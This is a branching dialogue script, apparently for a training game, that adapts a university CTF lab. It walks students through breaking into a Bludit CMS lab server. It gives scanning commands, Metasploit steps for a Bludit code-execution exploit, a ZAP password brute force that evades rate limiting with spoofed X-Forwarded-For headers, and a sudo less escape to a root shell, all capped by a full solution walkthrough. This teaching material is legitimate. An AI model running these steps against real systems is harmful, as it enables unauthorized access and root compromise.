// Feeling Blu Challenge - Web Security CTF Lab Sheet
// Based on HacktivityLabSheets: introducing_attacks/9_feeling_blu.md
// Author: Anatoliy Gorbenko, Z. Cliffe Schreuders, Andrew Scholey
// License: CC BY-SA 4.0

// Global persistent state
VAR instructor_rapport = 0
VAR ctf_mastery = 0
VAR challenge_mode = "guided" // "guided" or "ctf"

// External variables
EXTERNAL player_name

=== start ===
Haxolottle: Welcome, Agent {player_name}. I'm your coordinator for the "Feeling Blu" CTF Challenge.

~ instructor_rapport = 0
~ ctf_mastery = 0

Haxolottle: This is your final test - a comprehensive Capture The Flag challenge that brings together everything you've learned.

Haxolottle: You'll exploit a web server, gain access, escalate privileges, and hunt for flags. This simulates a real-world penetration test from start to finish.

Haxolottle: Before we begin, you need to choose how you want to approach this challenge.

-> choose_path

=== choose_path ===
Haxolottle: How do you want to tackle this CTF challenge?

+ [Pure CTF mode - minimal guidance, maximum challenge]
    ~ challenge_mode = "ctf"
    Haxolottle: Excellent choice! You'll get the full Capture The Flag experience.

    Haxolottle: I'll give you the tools and objectives, but you'll need to figure out the approach yourself.

    Haxolottle: Use everything you've learned: scanning, exploitation, privilege escalation, and persistence.

    Haxolottle: Only come back for hints if you're truly stuck. Good luck!

    ~ ctf_mastery += 20
    -> ctf_mode_hub

+ [Guided mode - walk me through the techniques]
    ~ challenge_mode = "guided"
    Haxolottle: A wise choice for learning! I'll guide you through each phase with explanations.

    Haxolottle: You'll learn web application exploitation, brute forcing, post-exploitation, and privilege escalation with structured guidance.

    Haxolottle: This approach ensures you understand not just how to exploit, but why each technique works.

    ~ instructor_rapport += 10
    -> guided_mode_hub

=== ctf_mode_hub ===
Haxolottle: This is CTF mode - you're on your own! Here's what I can tell you:

Haxolottle: Target: A web server running on your victim VM.

Haxolottle: Objectives: Find multiple flags, gain shell access, escalate to root.

Haxolottle: Tools available: Nmap, Dirb, Nikto, Metasploit, OWASP ZAP, and more.

+ [What tools should I start with?]
    Haxolottle: Think about the attack methodology: reconnaissance, scanning, exploitation, post-exploitation, privilege escalation.

    Haxolottle: Start by discovering what's running: Nmap for services, Dirb and Nikto for web enumeration.

    Haxolottle: Look for hidden files, admin panels, and leaked credentials.

    ~ instructor_rapport += 5

+ [I'm stuck - give me a hint about reconnaissance]
    -> ctf_recon_hints

+ [I'm stuck - give me a hint about exploitation]
    -> ctf_exploit_hints

+ [I'm stuck - give me a hint about privilege escalation]
    -> ctf_privesc_hints

+ [Tell me about the web security tools]
    -> web_tools_intro

+ [I want to switch to guided mode]
    -> switch_to_guided

+ [I'm done - show me the solution walkthrough]
    -> guided_mode_hub

+ [That's all for now]
    #exit_conversation
    -> END

=== ctf_recon_hints ===
Haxolottle: Alright, here's a hint for reconnaissance:

Haxolottle: Start with Nmap to identify services and versions: nmap -sV TARGET_IP

Haxolottle: Use Dirb to find hidden directories: dirb http://TARGET_IP

Haxolottle: Use Nikto for web vulnerabilities: nikto -h http://TARGET_IP

Haxolottle: Look carefully at discovered files - some contain very useful information about usernames and passwords!

Haxolottle: The CMS being used might have known exploits. Identify what CMS is running.

~ instructor_rapport += 5

-> ctf_mode_hub

=== ctf_exploit_hints ===
Haxolottle: Here's a hint for exploitation:

Haxolottle: You should have discovered Bludit CMS running on the server.

Haxolottle: Search Metasploit for Bludit exploits: search bludit

Haxolottle: You'll need both a username and password - these might have been leaked in hidden files.

Haxolottle: If you only have the username, consider brute-forcing the password using OWASP ZAP.

Haxolottle: The Bludit vulnerability allows arbitrary code execution and should give you a Meterpreter shell.

~ instructor_rapport += 5

-> ctf_mode_hub

=== ctf_privesc_hints ===
Haxolottle: Here's a hint for privilege escalation:

Haxolottle: After gaining initial access, check what sudo commands your user can run: sudo -l

Haxolottle: If your user can run certain commands with sudo, look for ways to escape from those commands to get a root shell.

Haxolottle: The 'less' command is particularly interesting - it can execute shell commands with !<command>

Haxolottle: If you can run 'less' with sudo, you can escape to a root shell!

~ instructor_rapport += 5

-> ctf_mode_hub

=== switch_to_guided ===
Haxolottle: Switching to guided mode. I'll walk you through the complete solution.

~ challenge_mode = "guided"

-> guided_mode_hub

=== guided_mode_hub ===
Haxolottle: Welcome to guided mode. I'll walk you through each phase of the challenge.

+ [Part 1: Information gathering and reconnaissance]
    -> phase_1_recon

+ [Part 2: Exploitation and gaining access]
    -> phase_2_exploitation

+ [Part 3: Optional - Brute forcing with OWASP ZAP]
    -> phase_3_bruteforce

+ [Part 4: Post-exploitation and flag hunting]
    -> phase_4_post_exploit

+ [Part 5: Privilege escalation to root]
    -> phase_5_privesc

+ [Tell me about web security tools first]
    -> web_tools_intro

+ [Show me the complete solution]
    -> complete_walkthrough

+ [Switch to CTF mode (no more guidance)]
    ~ challenge_mode = "ctf"
    -> ctf_mode_hub

+ [That's all for now]
    #exit_conversation
    -> END

=== web_tools_intro ===
Haxolottle: Let me introduce the key web security tools you'll need.

~ instructor_rapport += 5

Haxolottle: **Dirb** is a web content scanner that finds hidden files and directories using dictionary attacks.

Haxolottle: **Nikto** is a web vulnerability scanner that checks for dangerous files, outdated software, and misconfigurations.

Haxolottle: **OWASP ZAP** is an intercepting proxy that lets you capture, modify, and replay HTTP requests - perfect for brute forcing.

+ [How do I use Dirb?]
    Haxolottle: Dirb is straightforward: dirb http://TARGET_IP

    Haxolottle: It uses a built-in dictionary to test common paths like /admin/, /backup/, /config/, etc.

    Haxolottle: Pay attention to discovered files - they often contain credentials or sensitive configuration data.

    Haxolottle: Right-click discovered URLs to open them in your browser and examine their contents.

    ~ instructor_rapport += 5

+ [How do I use Nikto?]
    Haxolottle: Nikto scans for web vulnerabilities: nikto -h http://TARGET_IP

    Haxolottle: It checks for over 6,000 security issues including dangerous files, server misconfigurations, and known vulnerabilities.

    Haxolottle: The output shows each finding with references for more information.

    Haxolottle: Nikto results help you understand what attacks might be successful.

    ~ instructor_rapport += 5

+ [How do I use OWASP ZAP?]
    Haxolottle: OWASP ZAP acts as a proxy between your browser and the web server.

    Haxolottle: It intercepts HTTP requests and responses, allowing you to modify and replay them.

    Haxolottle: This is incredibly useful for brute forcing login forms, especially those with CSRF protection.

    Haxolottle: You can also use it to bypass IP-based rate limiting with the X-Forwarded-For header.

    ~ instructor_rapport += 5

- -> {challenge_mode == "ctf": ctf_mode_hub | guided_mode_hub}

=== phase_1_recon ===
Haxolottle: Phase 1 is all about information gathering - discovering what you're dealing with before launching attacks.

~ instructor_rapport += 5

Haxolottle: The attack methodology follows this sequence: reconnaissance, scanning, exploitation, post-exploitation, and privilege escalation.

Haxolottle: Each phase builds on the previous, so thorough reconnaissance is crucial.

+ [What should I scan for?]
    Haxolottle: Start with network reconnaissance: nmap -sV TARGET_IP

    Haxolottle: This identifies open ports, running services, and software versions.

    Haxolottle: Then scan the web application: dirb http://TARGET_IP

    Haxolottle: Follow up with: nikto -h http://TARGET_IP

    Haxolottle: Look for admin panels, configuration files, backup files, and anything that might contain credentials.

    ~ instructor_rapport += 5

+ [What am I looking for specifically?]
    Haxolottle: You're looking for several things:

    Haxolottle: What CMS (Content Management System) is running? This tells you what exploits might work.

    Haxolottle: Are there leaked credentials in discovered files? Check text files, logs, and backups.

    Haxolottle: Is there an admin login page? You might need to access it.

    Haxolottle: What server software and versions are running? This helps identify known vulnerabilities.

    Haxolottle: There's also a flag hidden in one of the discovered files!

    ~ instructor_rapport += 5

+ [Walk me through the reconnaissance process]
    Haxolottle: Here's the step-by-step process:

    Haxolottle: 1. Run Nmap: nmap -sV -p- TARGET_IP (scan all ports with version detection)

    Haxolottle: 2. Run Dirb: dirb http://TARGET_IP (find hidden directories and files)

    Haxolottle: 3. Run Nikto: nikto -h http://TARGET_IP (identify web vulnerabilities)

    Haxolottle: 4. Browse discovered URLs - open them in Firefox to see what they contain

    Haxolottle: 5. Look for patterns: usernames on the website, admin pages, leaked files

    Haxolottle: 6. Document everything - the CMS name, discovered usernames, any found credentials

    Haxolottle: The reconnaissance might reveal Bludit CMS with an admin login at /admin/

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_2_exploitation ===
Haxolottle: Phase 2 is exploitation - using discovered vulnerabilities to gain access.

~ instructor_rapport += 5

Haxolottle: Based on your reconnaissance, you should have identified Bludit CMS running on the server.

Haxolottle: Bludit has known vulnerabilities that we can exploit using Metasploit.

+ [How do I find Bludit exploits?]
    Haxolottle: In Metasploit, search for Bludit: search bludit

    Haxolottle: You'll find several modules. Look for ones related to code execution or file upload.

    Haxolottle: Use info to read about each exploit: info exploit/linux/http/bludit_upload_images_exec

    Haxolottle: This particular exploit allows arbitrary code execution through image upload functionality.

    ~ instructor_rapport += 5

+ [What do I need to exploit Bludit?]
    Haxolottle: The Bludit exploit requires several pieces of information:

    Haxolottle: RHOSTS: The target IP address

    Haxolottle: BLUDITUSER: The Bludit admin username (should have been discovered during recon)

    Haxolottle: BLUDITPASS: The admin password (might have been leaked, or you'll need to brute force it)

    Haxolottle: TARGETURI: Typically / (the root of the web server)

    Haxolottle: The exploit will give you a Meterpreter shell if successful!

    ~ instructor_rapport += 5

+ [What if I don't have the password?]
    Haxolottle: If you found the username but not the password, you have options:

    Haxolottle: Check all discovered files thoroughly - passwords are sometimes leaked in config files or backups

    Haxolottle: If truly not found, you can brute force it using OWASP ZAP (covered in optional Phase 3)

    Haxolottle: Bludit has CSRF protection and rate limiting, making brute forcing tricky but possible

    ~ instructor_rapport += 5

+ [Walk me through the exploitation]
    Haxolottle: Here's the complete exploitation process:

    Haxolottle: 1. Start Metasploit: msfconsole

    Haxolottle: 2. Search: search bludit

    Haxolottle: 3. Use the upload_images exploit: use exploit/linux/http/bludit_upload_images_exec

    Haxolottle: 4. Show options: show options

    Haxolottle: 5. Set target: set RHOSTS TARGET_IP

    Haxolottle: 6. Set username: set BLUDITUSER admin (or discovered username)

    Haxolottle: 7. Set password: set BLUDITPASS <discovered_password>

    Haxolottle: 8. Run exploit: exploit

    Haxolottle: If successful, you'll get a Meterpreter shell! This is your foothold in the system.

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_3_bruteforce ===
Haxolottle: Phase 3 is optional - brute forcing the Bludit password if you only have the username.

~ instructor_rapport += 5

Haxolottle: Bludit has protections against brute forcing: CSRF tokens and IP-based rate limiting.

Haxolottle: OWASP ZAP can bypass these protections with the right configuration.

+ [How does CSRF protection work?]
    Haxolottle: CSRF (Cross-Site Request Forgery) tokens are randomly generated by the server.

    Haxolottle: The server sends a token in each response, and the client must include it in the next request.

    Haxolottle: This prevents simple replay attacks because each request needs the current token.

    Haxolottle: OWASP ZAP can extract tokens from responses and insert them into requests automatically.

    ~ instructor_rapport += 5

+ [How does rate limiting protection work?]
    Haxolottle: After a certain number of failed login attempts from the same IP, Bludit blocks that IP temporarily.

    Haxolottle: You'll see messages like "Too many incorrect attempts. Try again in 30 minutes."

    Haxolottle: However, we can bypass this using the X-Forwarded-For HTTP header.

    Haxolottle: By randomizing the X-Forwarded-For IP, we make each attempt appear to come from a different client.

    ~ instructor_rapport += 5

+ [Walk me through the ZAP brute force process]
    Haxolottle: This is complex, so pay attention:

    Haxolottle: 1. Launch OWASP ZAP and configure it as a proxy

    Haxolottle: 2. Install the random_x_forwarded_for_ip.js script from the ZAP community scripts

    Haxolottle: 3. Browse to the Bludit login page through ZAP

    Haxolottle: 4. Attempt a login to capture the HTTP request in ZAP's history

    Haxolottle: 5. Right-click the POST request and select "Fuzz..."

    Haxolottle: 6. Select the password field and add a payload with common passwords

    Haxolottle: 7. Add the X-Forwarded-For script as a message processor

    Haxolottle: 8. Launch the fuzzer and look for different HTTP response codes

    Haxolottle: Successful logins typically return 301 or 302 (redirect) instead of 200 (error message).

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_4_post_exploit ===
Haxolottle: Phase 4 is post-exploitation - exploring the compromised system and hunting for flags.

~ instructor_rapport += 5

Haxolottle: You should have a Meterpreter shell from the exploitation phase.

Haxolottle: Now it's time to explore the system, understand your access level, and find flags.

+ [What Meterpreter commands should I use?]
    Haxolottle: Essential Meterpreter commands for exploration:

    Haxolottle: getuid - Shows your current username

    Haxolottle: sysinfo - System information (OS, architecture, etc.)

    Haxolottle: pwd - Print working directory

    Haxolottle: ls - List files in current directory

    Haxolottle: cat filename - Read file contents

    Haxolottle: cd /path - Change directory

    Haxolottle: shell - Drop to OS shell (Ctrl-C to return to Meterpreter)

    ~ instructor_rapport += 5

+ [Where should I look for flags?]
    Haxolottle: Flags are hidden in various locations:

    Haxolottle: Check your current directory - there might be a flag right where you land

    Haxolottle: Look in user home directories: /home/username/

    Haxolottle: Different users might have different flags

    Haxolottle: Eventually, you'll need to check /root/ but that requires privilege escalation

    Haxolottle: Some flags might be in encrypted files - note encryption hints for later

    ~ instructor_rapport += 5

+ [How do I switch users?]
    Haxolottle: To switch users, you need to drop to an OS shell first:

    Haxolottle: From Meterpreter, run: shell

    Haxolottle: Now you have a Linux shell. Use: su username

    Haxolottle: However, you'll need the user's password to switch

    Haxolottle: If you discovered the Bludit admin user's password earlier, you can switch to that user

    Haxolottle: Return to Meterpreter with Ctrl-C when done

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== phase_5_privesc ===
Haxolottle: Phase 5 is privilege escalation - gaining root access to fully control the system.

~ instructor_rapport += 5

Haxolottle: Your initial shell is likely running as the www-data user (the web server user) with limited privileges.

Haxolottle: To access all system files and read flags in /root/, you need to escalate to root.

+ [How do I check my privileges?]
    Haxolottle: From a shell, check your privileges:

    Haxolottle: whoami - Shows your username

    Haxolottle: id - Shows UID, GID, and groups

    Haxolottle: sudo -l - Lists commands you can run with sudo

    Haxolottle: Note: You might need a proper TTY terminal first: python3 -c 'import pty; pty.spawn("/bin/bash")'

    Haxolottle: This spawns a proper terminal that sudo will accept.

    ~ instructor_rapport += 5

+ [What's the sudo privilege escalation method?]
    Haxolottle: When you run sudo -l, you'll see what commands you can run as root.

    Haxolottle: If you can run /usr/bin/less with sudo, that's your ticket to root!

    Haxolottle: The 'less' command is a pager for viewing files, but it can also execute shell commands.

    Haxolottle: When viewing a file with less, press ! followed by a command to execute it.

    Haxolottle: Since less is running with sudo privileges, any command you run will execute as root!

    ~ instructor_rapport += 5

+ [Walk me through getting root access]
    Haxolottle: Here's the complete privilege escalation process:

    Haxolottle: 1. Drop to shell from Meterpreter: shell

    Haxolottle: 2. Spawn a proper terminal: python3 -c 'import pty; pty.spawn("/bin/bash")'

    Haxolottle: 3. Check sudo permissions: sudo -l

    Haxolottle: 4. You should see you can run less on a specific file

    Haxolottle: 5. Run that command with sudo: sudo /usr/bin/less /path/to/file

    Haxolottle: 6. When the file is displayed, type: !id

    Haxolottle: 7. You should see uid=0 (root!) in the output

    Haxolottle: 8. Now type: !/bin/bash

    Haxolottle: 9. You now have a root shell! Verify with: whoami

    Haxolottle: Now you can access /root/ and find the final flags!

    ~ instructor_rapport += 5

- -> guided_mode_hub

=== complete_walkthrough ===
Haxolottle: Here's the complete solution walkthrough from start to finish:

~ instructor_rapport += 10
~ ctf_mastery += 20

Haxolottle: **Phase 1 - Reconnaissance:**

Haxolottle: nmap -sV -p- TARGET_IP

Haxolottle: dirb http://TARGET_IP

Haxolottle: nikto -h http://TARGET_IP

Haxolottle: Browse discovered files, find admin login at /admin/, discover Bludit CMS, find leaked credentials

Haxolottle: **Phase 2 - Exploitation:**

Haxolottle: msfconsole

Haxolottle: search bludit

Haxolottle: use exploit/linux/http/bludit_upload_images_exec

Haxolottle: set RHOSTS TARGET_IP

Haxolottle: set BLUDITUSER admin (or discovered username)

Haxolottle: set BLUDITPASS discovered_password

Haxolottle: exploit

Haxolottle: **Phase 3 - Post-Exploitation:**

Haxolottle: getuid, sysinfo, ls, cat flag.txt (in current directory)

Haxolottle: shell

Haxolottle: su bludit_admin (with discovered password)

Haxolottle: cat ~/flag.txt (in that user's home)

Haxolottle: **Phase 4 - Privilege Escalation:**

Haxolottle: python3 -c 'import pty; pty.spawn("/bin/bash")'

Haxolottle: sudo -l (discover you can run less on a specific file)

Haxolottle: sudo /usr/bin/less /path/to/file

Haxolottle: !id (verify root)

Haxolottle: !/bin/bash (spawn root shell)

Haxolottle: cd /root && ls (find final flags)

Haxolottle: That's the complete solution! Try to replicate it yourself now that you understand the approach.

-> guided_mode_hub

-> END
